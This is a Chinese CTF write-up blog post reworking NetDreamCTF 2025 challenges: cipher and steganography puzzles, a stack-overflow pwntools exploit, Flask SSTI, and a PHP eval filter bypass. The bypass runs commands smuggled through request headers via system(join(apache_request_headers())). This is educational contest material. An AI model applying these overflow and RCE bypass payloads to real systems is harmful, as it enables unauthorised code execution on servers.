---
title: "第一届NetDreamCTF赛后复现"
date: "2025-08-17 13:59:14"
tags: ["ctf"]
categories: ["未分类"]
url: "/posts/38132.html"
abbrlink: "38132"
---

## 第一届NetDreamCTF赛后复现（部分题目）

全部的题解：https://mp.weixin.qq.com/s/zl151-YJSiyj0TvjKmNggw

存档：https://github.com/Team-intN18-SoybeanSeclab/NetDreamCTF2025_Source

纸豪学长的讲解：[netdream2025题目讲解 ezpwn&ezupload&ezbypass_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV14aYBzDEGA/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=3cad66818fbd72b6100b5f159983493b)

![image-20250817140400019](/images/image-20250817140400019.png)

### Misc

#### 签到

```
题目：你知道Base和TXT吗?Y3RmLmN0Zi52aW4=
```

base64解码之后 txt域名解析记录

![image-20250817140706604](/images/image-20250817140706604.png)

![image-20250817140803070](/images/image-20250817140803070.png)

#### I AM K!

```
题目：
B3F0re赵的立方体-1398441600

import base64

def encrypt(plaintext, key):
    key_sum = sum(ord(char) for char in key)
    if not plaintext.startswith("flag{"):
        plaintext = "flag{" + plaintext
    if not plaintext.endswith("}"):
        plaintext += "}"
    
    encrypted = []
    for char in plaintext:
        encrypted_char = (ord(char) + key_sum) % 256 
        encrypted.append(encrypted_char)

    encrypted_bytes = bytes(encrypted)
    base64_encoded = base64.b64encode(encrypted_bytes).decode('utf-8')
    shift = key_sum % 26
    caesar_shifted = ""
    for char in base64_encoded:
        if char.isalpha():
            shifted_char = chr(((ord(char) - ord('A') + shift) % 26 + ord('A'))) if char.isupper() else chr(((ord(char) - ord('a')) + shift) % 26 + ord('a'))
            caesar_shifted += shifted_char
        else:
            caesar_shifted += char
    hex_encoded = caesar_shifted.encode('utf-8').hex()
    
    return hex_encoded

key = "xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx"

plaintext = "Thi5 1s th3 Fl@g" 

ciphertext = encrypt(plaintext, key)
print(ciphertext)

#686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248
```

1.(ASCII值 + key_sum) % 256

2.字节列表转换为字节串，再进行 Base64 编码

3.凯撒移位

4.十六进制编码

这里是自己爆破密钥了 预期确实精妙【musc】

```python
import base64

def decrypt_with_keysum(ciphertext_hex, key_sum):
    try:
        # Hex decode
        ciphertext_bytes = bytes.fromhex(ciphertext_hex)
        caesar_shifted = ciphertext_bytes.decode('utf-8')

        # Reverse Caesar shift
        shift = key_sum % 26
        base64_encoded = ""
        for char in caesar_shifted:
            if char.isalpha():
                if char.isupper():
                    shifted_char = chr(((ord(char) - ord('A') - shift) % 26) + ord('A'))
                else:
                    shifted_char = chr(((ord(char) - ord('a') - shift) % 26) + ord('a'))
                base64_encoded += shifted_char
            else:
                base64_encoded += char

        # Base64 decode
        encrypted_bytes = base64.b64decode(base64_encoded)

        # Reverse additive cipher
        plaintext = ""
        for byte in encrypted_bytes:
            decrypted_char = (byte - key_sum) % 256
            plaintext += chr(decrypted_char)

        # Check for 'flag{...}'
        if plaintext.startswith("flag{") and plaintext.endswith("}"):
            return plaintext
        return None
    except:
        return None

ciphertext_hex = "686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248"

# Brute-force key_sum from 0 to 10000
for key_sum in range(10001):
    plaintext = decrypt_with_keysum(ciphertext_hex, key_sum)
    if plaintext:
        print(f"Found key_sum = {key_sum}, plaintext = {plaintext}")
        break
```

#### ezimg

这里做的时候被做局了 没看到py文件藏的 还是太单纯了

```
题目：给了张奶龙图片
```

![milkdragon (1)](/images/milkdragon (1).jpg)

使用winhex打开图片，在最后有两段的base64密文

![image-20250817142438533](/images/image-20250817142438533.png)

```
https://www.bilibili.com/video/BV1GJ411x7h7/
https://docs.qq.com/doc/DZWxobHhmRW9pd09k
```

第一个是纯骚扰

打开第二个，全部复制出来有

![image-20250817142615568](/images/image-20250817142615568.png)

```
并非flag
flag{114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r}
aHR0cHM6Ly93d2duLmxhbnpvdWwuY29tL2kzcTR5MzBodWVmYQ==
```

 再解密有一个下载链接里面有个压缩包里面是个py文件

 ![image-20250817142948773](/images/image-20250817142948773.png)

 没看到下面还有东西 没做出来

![image-20250817143016863](/images/image-20250817143016863.png)

 将上面获得的flag放进去解密就好了

```python
from cryptography.fernet import Fernet
import base64
key = base64.urlsafe_b64encode(b'flag{114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r}'[:32].ljust(32, b'\0')[:32])
cipher = Fernet(key)
c=
"gAAAAABoa6KH5msX3aA5PUiSZq1Ubma9DvtpU9ywyijLEbfQYNl-hn5Q_4NlmpcAD2pNjq07KvMYd2R32Id_R_3iW5GZn3yKTBW5R_5jFI_307_S9oep0zE0dhZCf_XOymC2WQhB2_6s"
decrypted = cipher.decrypt(c.encode())
print("Decrypted plaintext:", decrypted.decode())
```

### pwn

#### ezpwn

- 

这里贴一下[纸豪][netdream2025题目讲解 ezpwn&ezupload&ezbypass_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV14aYBzDEGA/?spm_id_from=333.1387.homepage.video_card.click&vd_source=3cad66818fbd72b6100b5f159983493b)学长~ 的链接 声音很帅

 ![image-20250817153655298](/images/image-20250817153655298.png)

 题目进来跟进到vuln

![image-20250817153729143](/images/image-20250817153729143.png)

 ![image-20250817154009298](/images/image-20250817154009298.png)

 明显的栈溢出 找后门地址和偏移量

![image-20250817154040309](/images/image-20250817154040309.png)

 

 

 ![image-20250817154054280](/images/image-20250817154054280.png)

 

使用cyclic工具测算

```
cyclic 100
gdb ./pwn
输入生成的字符串 看到停在了0x61616174
cyclic -l 0x61616174 得到偏移量76
```

![image-20250817155853433](/images/image-20250817155853433.png)

```
from pwn import *
p = process('./attachment')
#p = remote("127.0.0.1", 9999)
payload = b'a' * 76 + p32(0x080491B6)

p.sendline(payload)
p.interactive()
```

![image-20250817164600305](/images/image-20250817164600305.png)

### web

web都是docker拉下来的 flag是自己填上去的 都一样的 

#### ezpython

```
Hint：fuzz部分需要爆破http://x.x.x.x/的路径，六位数
```

进来是一个空白页面 查看源代码 访问下一级目录

![image-20250824141424090](/images/image-20250824141424090.png)

进来提示爆破数字组的目录 使用burp爆破一手 六位数 

![image-20250824141505057](/images/image-20250824141505057.png)

![image-20250824142613374](/images/image-20250824142613374.png)

![image-20250824142657740](/images/image-20250824142657740.png)

跟burp一样爆破参数名 当访问name?=1的时候 发现页面更改了 flask+python 打一套ssti

![image-20250824142949912](/images/image-20250824142949912.png)

![image-20250824144022280](/images/image-20250824144022280.png)

#### ezbypass

这是一题绕过滤rce题

``` php
<?php
$test=$_GET['test'];
if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\|implode|phpinfo|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|session_id|session_start|echo|readfile|highlight|show|source|file|assert/i", $test)){
    eval($test);
}
else{
    echo "oh nonono hacker!";
}
highlight_file(__FILE__); 
```

过滤了很多运行的命令字符 但是没有过滤system 可以用system来执行命令 发现被禁了getallheaders 但是有别名apache_request_headers()的字符可以使用 end可以使用join使用

 ```
 getallheaders()
 getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）
 当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：
 var_dump(end(getallheaders()));
 ```

![image-20250824153315095](/images/image-20250824153315095.png)

![image-20250824153733382](/images/image-20250824153733382.png)

system(join(apache_request_headers()))；

![image-20250824154125855](/images/image-20250824154125855.png)

#### 
